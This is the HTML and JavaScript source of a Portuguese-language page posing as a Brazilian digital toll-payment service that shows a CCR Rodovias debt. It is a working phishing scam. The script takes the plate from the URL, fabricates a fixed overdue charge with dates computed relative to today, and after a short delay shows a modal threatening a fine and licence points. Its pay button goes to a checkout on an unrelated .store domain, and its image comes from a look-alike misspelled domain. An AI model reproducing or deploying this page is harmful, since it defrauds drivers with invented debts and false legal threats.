<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Débitos - Pedágio Digital</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: #f2f2f2;
            color: #333;
            padding-bottom: 140px;
        }

        /* Header Fix */
        header {
            background-color: #ffffff;
            height: 55px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            border-bottom: 1px solid #eee;
        }

        .back-btn {
            position: absolute;
            left: 15px;
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
        }

        header h1 {
            font-size: 16px;
            font-weight: 600;
        }

        /* IMAGEM DO TOPO - CORREÇÃO DE EMBED */
        .hero-container {
            width: 100%;
            height: 190px;
            position: relative;
            overflow: hidden;
            background-color: #000;
        }

        .hero-img {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Faz a imagem preencher tudo sem deformar */
            display: block;
        }

        .vehicle-label-overlay {
            position: absolute;
            bottom: 40px; /* Sobe um pouco por causa da caixa da placa */
            left: 20px;
            color: white;
            font-size: 13px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 6px;
            text-shadow: 0 1px 4px rgba(0,0,0,0.8);
            z-index: 5;
        }

        /* CAIXA DA PLACA SOBREPOSTA À IMAGEM */
        .plate-wrapper {
            padding: 0 20px;
            margin-top: -30px; /* Puxa a caixa para dentro da imagem */
            position: relative;
            z-index: 10;
        }

        .plate-box {
            background: white;
            border-radius: 10px;
            padding: 18px;
            font-size: 15px;
            color: #444;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            font-weight: 500;
            border: 1px solid #f0f0f0;
        }

        /* Status e Atualização */
        .status-bar {
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .status-title { font-weight: 700; font-size: 14px; }
        .update-time { font-size: 10px; color: #888; }

        /* Lista de Passagens */
        .select-header {
            padding: 10px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 12px;
            border-bottom: 1px solid #e5e5e5;
        }

        .debit-card {
            padding: 20px;
            display: flex;
            gap: 15px;
            border-bottom: 1px solid #e5e5e5;
            background: #f2f2f2;
        }

        input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #000;
        }

        .card-content {
            flex: 1;
            display: flex;
            justify-content: space-between;
        }

        .col-left { display: flex; flex-direction: column; gap: 4px; }
        .col-left .p-plate { font-weight: 700; font-size: 14px; color: #000; }
        .col-left .p-date { font-size: 12px; color: #666; }
        .col-left .p-op { font-weight: 600; font-size: 13px; color: #000; }

        .col-right { display: flex; flex-direction: column; align-items: flex-end; }
        
        /* O DETALHE QUE VOCE PEDIU NO CHECKBOX/CARD */
        .vencimento-badge {
            border: 1px solid #d32f2f;
            color: #d32f2f;
            font-size: 9px;
            font-weight: 800;
            padding: 2px 5px;
            border-radius: 4px;
            margin-bottom: 6px;
            text-transform: uppercase;
        }

        .p-price { font-weight: 800; font-size: 15px; color: #000; }
        .p-taxes { font-size: 9px; color: #d32f2f; margin: 2px 0; font-weight: 600; }
        .p-total { font-weight: 700; font-size: 13px; color: #000; }

        /* Barra Inferior (Footer) */
        .fixed-footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            background: white;
            padding: 20px;
            border-radius: 20px 20px 0 0;
            box-shadow: 0 -5px 20px rgba(0,0,0,0.08);
            z-index: 100;
        }

        .footer-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }

        .footer-price {
            font-size: 14px;
            margin-bottom: 15px;
            color: #333;
        }

        .btn-pay {
            background: #000;
            color: #fff;
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
        }

        /* Modal Alerta */
        .modal-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); display: none; align-items: center; justify-content: center; z-index: 2000;
        }
        .modal-content { background: white; width: 90%; max-width: 350px; border-radius: 15px; padding: 25px; text-align: center; }
        .text-red { color: #d32f2f; font-weight: bold; }
    </style>
</head>
<body>

    <header>
        <button class="back-btn" onclick="window.history.back()">‹</button>
        <h1>Débitos</h1>
    </header>

    <div id="main">
        <div class="hero-container">
            <img src="https://pedagiosdiigital.in.net/images/home-KlC6Y-6S.png" class="hero-img">
            <div class="vehicle-label-overlay">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 17h2c.6 0 1-.4 1-1v-3c0-.9-.7-1.7-1.5-1.9C18.7 10.6 16 10 16 10s-1.3-1.4-2.2-2.3c-.5-.4-1.1-.7-1.8-.7H5c-.6 0-1.1.4-1.4.9l-1.4 2.9A3.7 3.7 0 0 0 2 12v4c0 .6.4 1 1 1h2"/><circle cx="7" cy="17" r="2"/><circle cx="17" cy="17" r="2"/></svg>
                Seus veículos:
            </div>
        </div>

        <div class="plate-wrapper">
            <div class="plate-box" id="displayPlate">CARREGANDO...</div>
        </div>

        <div class="status-bar">
            <span class="status-title">Débitos</span>
            <span class="update-time" id="updateText">Atualizado em: --/--/----</span>
        </div>

        <div class="select-header">
            <input type="checkbox" checked>
            <span>Selecionar 1 passagens em aberto</span>
        </div>

        <div class="debit-card">
            <input type="checkbox" checked>
            <div class="card-content">
                <div class="col-left">
                    <span class="p-plate" id="itemPlate">---</span>
                    <span class="p-date" id="itemDate">--/--/---- --:--</span>
                    <span class="p-op">CCR Rodovias</span>
                </div>
                <div class="col-right">
                    <div class="vencimento-badge" id="vencimentoText">Venceu em --/--/----</div>
                    
                    <span class="p-price">R$ 71,46</span>
                    <span class="p-taxes">Multa + Juros: R$ 0,00 + R$ 0,00</span>
                    <span class="p-total">Total: 71,46</span>
                </div>
            </div>
        </div>
    </div>

    <div class="fixed-footer">
        <div class="footer-info">
            <span style="font-weight: 600; font-size: 14px;">Total a pagar:</span>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
        </div>
        <div class="footer-price">R$ 0,00</div>
        <button class="btn-pay" onclick="window.location.href='https://checkout.escrtoriobrasil.store/VCCL1O8SCOW9'">
            Continuar
        </button>
    </div>

    <div id="modalCtb" class="modal-bg">
        <div class="modal-content">
            <div class="text-red" style="font-size: 18px; margin-bottom: 12px;">⚠ ATENÇÃO</div>
            <p style="font-size: 14px; line-height: 1.5;">
                <span class="text-red">Hoje, <span id="mDate"></span></span> - Caso não realize o pagamento, o sistema emitirá multa de <span class="text-red">R$ 195,23</span> e <span class="text-red">5 pontos na CNH</span> (Art. 209-A).
            </p>
            <button class="btn-pay" style="margin-top: 20px;" onclick="document.getElementById('modalCtb').style.display='none'">CONTINUAR</button>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // PEGAR PLACA DA URL
            const urlParams = new URLSearchParams(window.location.search);
            const placa = urlParams.get('plate') || 'PLACA';
            
            document.getElementById('displayPlate').textContent = placa.toUpperCase();
            document.getElementById('itemPlate').textContent = placa.toUpperCase();

            // DATAS DINAMICAS
            const hoje = new Date();
            const dataFormatada = hoje.toLocaleDateString('pt-BR');
            const horaFormatada = hoje.toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'});

            document.getElementById('updateText').textContent = `Atualizado em: ${dataFormatada} - ${horaFormatada}`;
            document.getElementById('mDate').textContent = dataFormatada;
            
            // Data da passagem (3 dias atras) e Vencimento (ontem)
            const dataPassagem = new Date();
            dataPassagem.setDate(hoje.getDate() - 3);
            document.getElementById('itemDate').textContent = `${dataPassagem.toLocaleDateString('pt-BR')} 02:10:44`;
            
            const dataVencimento = new Date();
            dataVencimento.setDate(hoje.getDate() - 1);
            document.getElementById('vencimentoText').textContent = `Venceu em ${dataVencimento.toLocaleDateString('pt-BR')}`;

            // Exibir Modal
            setTimeout(() => {
                document.getElementById('modalCtb').style.display = 'flex';
            }, 800);
        });
    </script>
</body>
</html>
